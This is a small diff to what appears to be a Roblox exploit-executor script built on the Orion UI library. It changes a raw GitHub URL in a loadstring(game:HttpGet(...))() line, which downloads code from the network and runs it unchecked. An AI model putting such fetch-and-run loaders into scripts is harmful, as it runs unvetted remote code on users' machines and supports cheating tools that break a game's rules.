@@ -10,7 +10,7 @@ OrionLib:MakeNotification({
 
 
 getgenv().gui = false
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NzxCrab-wq/BlastHub/main/NzxCrab"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NzxCrab-wq/OrionLibrary/main/NzxCrab"))()
 
 --[[
 Name = <string> - The name of the UI.
